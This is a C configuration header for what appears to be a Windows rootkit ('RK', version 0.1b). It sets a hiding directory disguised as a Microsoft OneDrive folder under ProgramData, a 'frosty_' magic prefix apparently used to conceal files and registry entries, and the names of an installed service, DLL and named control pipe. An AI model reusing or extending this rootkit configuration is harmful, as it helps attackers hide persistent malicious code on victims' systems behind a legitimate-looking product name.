#ifndef _CONFIG_H
#define _CONFIG_H

#define RK_VERSION "0.1b"

#define HIDE_PATH L"C:\\ProgramData\\Microsoft OneDrive"
#define HIDE_REG L"$$frosty_"
#define MAGIC_PREFIX L"frosty_"

#define RK_SERVICE_NAME MAGIC_PREFIX L"rk"
#define RK_SERVICE_PATH HIDE_PATH L"\\" MAGIC_PREFIX L"Service.exe"
#define RK_DLL_PATH HIDE_PATH L"\\" MAGIC_PREFIX L"Dll.dll"

#define RK_SERVICE_FILENAME MAGIC_PREFIX L"Service.exe"
#define RK_DLL_FILENAME MAGIC_PREFIX L"Dll.dll"

#define RK_PIPE L"\\\\.\\pipe\\" MAGIC_PREFIX L"rk"
#define RK_UNINSTALL 0x0

#endif